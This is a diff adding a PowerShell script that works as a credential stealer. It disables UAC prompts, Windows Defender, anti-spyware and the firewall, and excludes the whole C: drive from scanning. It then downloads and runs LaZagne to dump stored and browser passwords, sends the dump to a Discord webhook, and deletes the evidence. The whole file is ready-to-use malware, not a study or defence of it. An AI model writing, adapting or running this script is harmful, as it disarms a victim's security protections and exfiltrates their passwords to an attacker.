@@ -1,0 +1,55 @@
+# Mr-Proxy-Source on github!
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+# Disabling the UAC
+Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
+
+# Disabling the Firewal
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# Disabling the WD Protection
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
+# Adding an exclusion
+Add-MpPreference -ExclusionPath "C:\"
+
+# Download LaZagne and execute it
+$Test = "C:\temp"
+Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -Destination "$Test/l.exe"
+Set-Location $Test
+Start-Sleep -Milliseconds 15000
+.\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
+
+# Define the Discord webhook URL
+$WebhookURL = "https://discord.com/api/webhooks/your-webhook-url"
+
+# Send the result file to the Discord webhook
+$ResultFile = "$Test\$env:computername.txt"
+
+try {
+    # Read the file content
+    $FileContent = Get-Content -Path $ResultFile -Raw
+
+    # Construct the JSON payload
+    $Payload = @{
+        content = "LaZagne results"
+        file = @{
+            value = $FileContent
+            filename = $env:computername + ".txt"
+        }
+    } | ConvertTo-Json
+
+    # Send the request to the Discord webhook
+    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "application/json" -Body $Payload
+
+    Write-Host "File sent to Discord webhook successfully."
+} catch {
+    Write-Host "Failed to send file to Discord webhook. Error: $_"
+}
+
+# Cleanup leftover files
+Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue
+
+# Exit
+Start-Sleep -Milliseconds 2500
+exit
